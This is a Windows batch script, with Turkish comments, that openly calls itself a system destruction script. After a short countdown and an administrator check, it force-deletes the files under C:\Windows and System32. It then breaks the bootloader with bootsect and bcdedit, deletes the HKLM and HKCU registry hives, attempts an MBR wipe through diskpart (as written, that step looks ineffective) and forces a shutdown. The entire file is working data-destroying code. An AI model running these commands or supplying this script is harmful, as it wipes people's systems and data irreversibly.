@echo off
echo 🚨 WINDOWS DESTRUCTION SCRIPT
echo ----------------------------
echo This will DESTROY your Windows system!
echo Press CTRL+C to cancel in 5 seconds...

timeout /t 5 /nobreak >nul

echo Starting system destruction...

:: 1. Admin kontrolü
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Run as Administrator!
    pause
    exit /b 1
)

:: 2. Sistem dosyalarını sil
echo Phase 1: Deleting system files...
del /f /s /q C:\Windows\System32\*.* >nul 2>&1
del /f /s /q C:\Windows\*.* >nul 2>&1

:: 3. Bootloader'ı yok et
echo Phase 2: Destroying bootloader...
bootsect /nt52 C: /force >nul 2>&1
bcdedit /delete {current} /f >nul 2>&1

:: 4. Registry'yi temizle
echo Phase 3: Cleaning registry...
reg delete "HKLM" /f >nul 2>&1
reg delete "HKCU" /f >nul 2>&1

:: 5. MBR'yi sıfırla
echo Phase 4: Zeroing MBR...
echo 0 | diskpart >nul 2>&1

:: 6. Zorla kapat
echo Phase 5: Shutting down...
echo 💀 SYSTEM DESTROYED - GOODBYE!
shutdown /s /f /t 0
